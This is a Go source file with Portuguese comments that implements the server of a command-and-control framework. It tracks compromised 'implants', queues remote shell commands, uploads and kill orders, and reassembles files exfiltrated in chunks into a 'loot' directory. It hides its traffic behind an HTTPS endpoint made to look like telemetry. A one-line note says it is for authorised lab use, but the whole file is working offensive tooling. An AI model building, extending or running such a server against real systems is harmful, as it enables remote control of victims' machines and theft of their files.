// Server C2 v2 — chunking (T1105), tasks com expiry, cert persistente.
// Uso exclusivo em laboratório autorizado.
package main

import (
	"bufio"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/seuusuario/lab-c2/internal/proto"
)

const TASK_TTL = 10 * time.Minute // deadline: tasks expiram se não coletadas

type queueEntry struct {
	task    proto.Task
	created time.Time
}

type server struct {
	mu        sync.Mutex
	key       []byte
	implants  map[string]proto.SysInfo
	taskQueue map[string][]queueEntry
	results   map[string][]proto.Result
	// remontagem de chunks: uid → estado da transferência
	transfers map[string]*transfer
}

type transfer struct {
	chunks   map[int][]byte
	fileName string
	total    int
	hash     string
}

func newServer(secret string)*server {
	return &server{
		key:proto.DeriveKey(secret),
		implants:make(map[string]proto.SysInfo),
		taskQueue:make(map[string][]queueEntry),
		results:make(map[string][]proto.Result),
		transfers:make(map[string]*transfer),
	}
}

func (s*server)handleBeacon(w http.ResponseWriter,r *http.Request) {
	if r.Method !=http.MethodPost {
		http.Error(w,"método não permitido",http.StatusMethodNotAllowed)
		return
	}

	body := make([]byte,r.ContentLength)
	if _,err := io.ReadFull(r.Body,body);err !=nil {
		http.Error(w,"corpo inválido",http.StatusBadRequest)
		return
	}
	var msg proto.Message
	if err := proto.DecodeMessage(s.key,string(body),&msg);err !=nil {
		http.Error(w,"não autorizado",http.StatusUnauthorized)
		return
	}

	s.mu.Lock()

	if _,ok := s.implants[msg.ID]; !ok &&msg.Info.Hostname !="" {
		s.implants[msg.ID]= msg.Info
		logf("[+] NOVO IMPLANTE %s — %s\\%s @ %s (pid %d)",
			msg.ID[:8],msg.Info.OS,msg.Info.User,msg.Info.Hostname,msg.Info.PID)
	}

	for _,res := range msg.Results {
		s.results[msg.ID]= append(s.results[msg.ID],res)
		logf("[=] %s task %s: %.120s",msg.ID[:8],res.UID,res.Output)
		s.receiveChunk(res,msg.ID)// ← T1105: remontagem
	}

	// entrega fila, descartando tasks expiradas (deadline)
	var tasks []proto.Task
	now := time.Now()
	for _,e := range s.taskQueue[msg.ID] {
		if now.Sub(e.created) >TASK_TTL {
			logf("[!] task %s expirou — descartada",e.task.UID)
			continue
		}
		tasks = append(tasks,e.task)
	}
	delete(s.taskQueue,msg.ID)
	s.mu.Unlock()

	resp := proto.Message{ID:msg.ID,Kind:"tasks",Tasks:tasks}
	enc,err := proto.EncodeMessage(s.key,resp)
	if err !=nil {
		http.Error(w,"erro interno",http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type","application/octet-stream")
	w.Write([]byte(enc))
}

// receiveChunk acumula chunks e remonta quando o último chega,
// validando o hash SHA-256 antes de salvar.
func (s*server)receiveChunk(res proto.Result,implantID string) {
	if res.Seq ==0 ||res.Total ==0 {
		return // resultado comum, não é chunk
	}
	t := s.transfers[res.UID]
	if t ==nil {
		t = &transfer{chunks:make(map[int][]byte),fileName:res.FileName,total:res.Total,hash:res.Hash}
		s.transfers[res.UID]= t
	}
	t.chunks[res.Seq]= res.Data

	if len(t.chunks) <t.total {
		logf("[↓] chunk %d/%d de %s (%d bytes)",res.Seq,res.Total,t.fileName,len(res.Data))
		return
	}

	// último chunk — remonta e valida
	var full []byte
	for i := 1;i <=t.total;i++ {
		full = append(full,t.chunks[i]...)
	}
	sum := sha256.Sum256(full)
	got := hex.EncodeToString(sum[:])
	if t.hash !="" &&got !=t.hash {
		logf("[!] hash divergente em %s (esperado %s, obtido %s) — descartado",
			t.fileName,t.hash[:16],got[:16])
	}else {
		fname := fmt.Sprintf("loot/%s_%s",implantID[:8],t.fileName)
		if err := os.WriteFile(fname,full,0600);err ==nil {
			logf("[+] download completo: %s (%d bytes) — hash OK",fname,len(full))
		}
	}
	delete(s.transfers,res.UID)
}

// ===== CONSOLE =====

func (s*server)console() {
	scanner := bufio.NewScanner(os.Stdin)
	printHelp()
	for {
		fmt.Print("c2> ")
		if !scanner.Scan() {
			return
		}
		f := strings.Fields(scanner.Text())
		if len(f) ==0 {
			continue
		}
		switch f[0] {
		case "help":
			printHelp()
		case "implants":
			s.mu.Lock()
			if len(s.implants) ==0 {
				fmt.Println("nenhum implante registrado ainda")
			}
			for id,info := range s.implants {
				fmt.Printf("  %s  %s\\%s @ %s\n",id[:8],info.OS,info.User,info.Hostname)
			}
			s.mu.Unlock()
		case "shell":
			if len(f) <3 {
				fmt.Println("uso: shell <id> <comando>")
				continue
			}
			s.enqueue(f[1],"shell "+strings.Join(f[2:]," "),nil)
		case "sleep":
			if len(f) !=3 {
				fmt.Println("uso: sleep <id> <segundos>")
				continue
			}
			s.enqueue(f[1],"sleep "+f[2],nil)
		case "download":
			if len(f) <3 {
				fmt.Println("uso: download <id> <caminho-no-alvo>")
				continue
			}
			s.enqueue(f[1],"download "+strings.Join(f[2:]," "),nil)
		case "upload":
			if len(f) <4 {
				fmt.Println("uso: upload <id> <arquivo-local> <destino-no-alvo>")
				continue
			}
			content,err := os.ReadFile(f[2])
			if err !=nil {
				fmt.Println("erro ao ler arquivo local:",err)
				continue
			}
			if len(content) >proto.CHUNK_SIZE {
				fmt.Println("[!] aviso: upload ainda não fragmentado — limite sugerido 256 KB (ver roadmap)")
			}
			s.enqueue(f[1],"upload "+strings.Join(f[3:]," "),content)
		case "kill":
			if len(f) !=2 {
				fmt.Println("uso: kill <id>")
				continue
			}
			s.enqueue(f[1],"exit",nil)
		case "quit":
			os.Exit(0)
		default:
			fmt.Println("comando desconhecido. digite 'help'")
		}
	}
}

func printHelp() {
	fmt.Println(`
Comandos:
  help                          ajuda
  implants                      lista implantes
  shell <id> <cmd>              executa comando no alvo
  sleep <id> <segundos>         muda beaconing
  download <id> <caminho>       exfiltra arquivo (em chunks de 256 KB)
  upload <id> <local> <destino> envia arquivo
  kill <id> / quit              encerra implante / servidor`)
}

func (s*server)enqueue(id,cmd string,data []byte) {
	s.mu.Lock()
	s.taskQueue[id]= append(s.taskQueue[id],queueEntry{
		task:proto.Task{
			UID:fmt.Sprintf("%08x",time.Now().UnixNano()),
			Cmd:cmd,
			Data:data,
		},
		created:time.Now(),
	})
	s.mu.Unlock()
	logf("[*] task enfileirada para %s: %s",id[:8],cmd)
}

func logf(format string,args ...any) {
	fmt.Printf("["+time.Now().Format("15:04:05")+"] "+format+"\n",args...)
}

// ===== MAIN =====

func main() {
	port := flag.Int("port",443,"porta HTTPS")
	secret := flag.String("secret","chave-super-secreta-do-lab","segredo compartilhado")
	certFile := flag.String("cert","c2.crt","certificado TLS persistente")
	keyFile := flag.String("key","c2.key","chave privada TLS")
	flag.Parse()

	os.MkdirAll("loot",0700)
	s := newServer(*secret)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/telemetry",s.handleBeacon)// path "plausível" p/ mímica

	// Cert PERSISTENTE: o implante faz pinning nele — não pode mudar a cada boot
	cert,err := tls.LoadX509KeyPair(*certFile,*keyFile)
	if err !=nil {
		logf("[!] não achou %s/%s — gere com openssl (ver README). err: %v",*certFile,*keyFile,err)
		os.Exit(1)
	}

	srv := &http.Server{
		Addr:fmt.Sprintf(":%d",*port),
		Handler:mux,
		TLSConfig:&tls.Config{Certificates: []tls.Certificate{cert}},
	}

	go func() {
		logf("[*] C2 em https://0.0.0.0:%d/api/v1/telemetry",*port)
		if err := srv.ListenAndServeTLS("","");err !=nil {
			logf("[!] listener: %v",err)
			os.Exit(1)
		}
	}()

	s.console()
}

// generateCert utilitário (fallback se quiser gerar via Go em vez de openssl)
func generateCert() (tls.Certificate,error) {
	key,_ := ecdsa.GenerateKey(elliptic.P256(),rand.Reader)
	tpl := x509.Certificate{
		SerialNumber:big.NewInt(1),
		NotBefore:time.Now(),
		NotAfter:time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:x509.KeyUsageKeyEncipherment |x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:     []string{"localhost"},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
	}
	der,err := x509.CreateCertificate(rand.Reader,&tpl,&tpl,&key.PublicKey,key)
	if err !=nil {
		return tls.Certificate{},err
	}
	return tls.X509KeyPair(
		pem.EncodeToMemory(&pem.Block{Type:"CERTIFICATE",Bytes:der}),
		pem.EncodeToMemory(&pem.Block{Type:"EC PRIVATE KEY",Bytes:marshalEC(key)}),
	)
}

func marshalEC(k *ecdsa.PrivateKey) []byte {
	d,_ := x509.MarshalECPrivateKey(k)
	return d
}
